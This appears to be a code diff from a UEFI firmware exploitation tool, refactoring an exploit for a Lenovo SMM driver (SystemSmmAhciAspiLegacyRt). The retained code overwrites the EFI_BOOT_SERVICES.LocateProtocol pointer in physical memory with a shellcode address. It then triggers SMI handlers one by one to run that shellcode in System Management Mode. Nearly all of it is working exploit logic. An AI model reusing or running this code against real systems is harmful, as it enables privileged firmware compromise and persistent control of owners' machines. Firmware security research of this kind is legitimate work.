@@ -182,13 +182,38 @@ static void smm_image_section_workaround(void)
 
 #pragma optimize("", on)
 //--------------------------------------------------------------------------------------
+bool expl_lenovo_SystemSmmAhciAspiLegacyRt_init(PUEFI_EXPL_TARGET target, int target_num)
+{
+    if (target_num != -1)
+    {
+        // use known target
+        if (target_num < 0 || target_num >= sizeof(g_targets) / sizeof(UEFI_EXPL_TARGET))
+        {
+            printf(__FUNCTION__"() ERROR: Invalid target number %d\n", target_num);
+            return false;
+        }
+
+        // get specific target information
+        memcpy(target, &g_targets[target_num], sizeof(UEFI_EXPL_TARGET));        
+    }
+    else
+    {
+        if (target->smi_num != -1 && target->smi_num > MAX_SMI_NUM)
+        {
+            printf(__FUNCTION__"() ERROR: SMI handler number %d is invalid\n", target->smi_num);
+            return false;
+        }
+    }
+
+    return true;
+}
+//--------------------------------------------------------------------------------------
 bool expl_lenovo_SystemSmmAhciAspiLegacyRt(
-    int target, PUEFI_EXPL_TARGET custom_target, 
+    PUEFI_EXPL_TARGET target, 
     UEFI_EXPL_SMM_HANDLER handler, void *context, 
     bool quiet)
 {
     bool ret = false;
-    UEFI_EXPL_TARGET *expl_target = NULL;
     UEFI_EXPL_SMM_SHELLCODE_CONTEXT smm_context;    
 
     smm_context.smi_count = 0;
@@ -197,40 +222,12 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(
     // see comments
     smm_image_section_workaround();
 
-    if (target != -1)
+    if (!quiet)
     {
-        // use known target
-        if (target < 0 || target >= sizeof(g_targets) / sizeof(UEFI_EXPL_TARGET))
-        {
-            printf(__FUNCTION__"() ERROR: Invalid target number %d\n", target);
-            return false;
-        }
-
-        // get target model information
-        expl_target = &g_targets[target];
-
-        if (!quiet)
-        {
-            printf("Using target \"%s\"\n", expl_target->name);
-        }
-    }
-    else if (custom_target)
-    {
-        if (custom_target->smi_num != -1 && custom_target->smi_num > MAX_SMI_NUM)
-        {
-            printf(__FUNCTION__"() ERROR: SMI handler number %d is invalid\n", expl_target->smi_num);
-            return false;
-        }
-
-        // use custom caller specified target
-        expl_target = custom_target;
-    }
-    else
-    {
-        return false;
+        printf("Using target \"%s\"\n", target->name);
     }
 
-    if (expl_target->addr == 0)
+    if (target->addr == 0)
     {
         // find EFI_BOOT_SERVICES.LocateProtocol address dynamically
         unsigned long long efi_boot_services = win_get_efi_boot_services();
@@ -240,17 +237,17 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(
             return false;
         }
         
-        expl_target->addr = efi_boot_services + EFI_BOOT_SERVICES_LocateProtocol;
+        target->addr = efi_boot_services + EFI_BOOT_SERVICES_LocateProtocol;
     }
 
     if (!quiet)
     {
-        printf("EFI_BOOT_SERVICES.LocateProtocol address is 0x%llx\n", expl_target->addr);
+        printf("EFI_BOOT_SERVICES.LocateProtocol address is 0x%llx\n", target->addr);
     }
 
-    if (!quiet && expl_target->smi_num != -1)
+    if (!quiet && target->smi_num != -1)
     {
-        printf("SMI handler number is %d\n", expl_target->smi_num);
+        printf("SMI handler number is %d\n", target->smi_num);
     }
 
     if (handler)
@@ -313,28 +310,28 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(
             unsigned long long ptr_val = 0;
 
             // read original pointer value
-            if (uefi_expl_phys_mem_read(expl_target->addr, sizeof(ptr_val), (unsigned char *)&ptr_val))
+            if (uefi_expl_phys_mem_read(target->addr, sizeof(ptr_val), (unsigned char *)&ptr_val))
             {
                 if (!quiet)
                 {
-                    printf("Old pointer 0x%llx value is 0x%llx\n", expl_target->addr, ptr_val);
+                    printf("Old pointer 0x%llx value is 0x%llx\n", target->addr, ptr_val);
                 }
 
-                smm_context.ptr_addr = expl_target->addr;
+                smm_context.ptr_addr = target->addr;
                 smm_context.ptr_val = ptr_val;
 
                 // overwrite pointer value
-                if (uefi_expl_phys_mem_write(expl_target->addr, sizeof(sc_phys_addr), (unsigned char *)&sc_phys_addr))
+                if (uefi_expl_phys_mem_write(target->addr, sizeof(sc_phys_addr), (unsigned char *)&sc_phys_addr))
                 {
                     unsigned char smi_num = 0;
 
-                    if (expl_target->smi_num != -1)
+                    if (target->smi_num != -1)
                     {
                         /*
                             Use specific SMI handler, in other case -- try to exploit
                             all of the SMI handlers from 0 to 255.
                         */
-                        smi_num = (unsigned char)expl_target->smi_num;
+                        smi_num = (unsigned char)target->smi_num;
                     }
 
                     while (smi_num < MAX_SMI_NUM)
@@ -361,9 +358,9 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(
                             printf(__FUNCTION__"() ERROR: uefi_expl_smi_invoke() fails\n");
                         }                        
 
-                        if (expl_target->smi_num != -1 || ret)
+                        if (target->smi_num != -1 || ret)
                         {
-                            expl_target->smi_num = smi_num;
+                            target->smi_num = smi_num;
                             break;
                         }
 
@@ -372,7 +369,7 @@ bool expl_lenovo_SystemSmmAhciAspiLegacyRt(
                     }
 
                     // restore overwritten value
-                    uefi_expl_phys_mem_write(expl_target->addr, sizeof(ptr_val), (unsigned char *)&ptr_val);
+                    uefi_expl_phys_mem_write(target->addr, sizeof(ptr_val), (unsigned char *)&ptr_val);
                 }
                 else
                 {
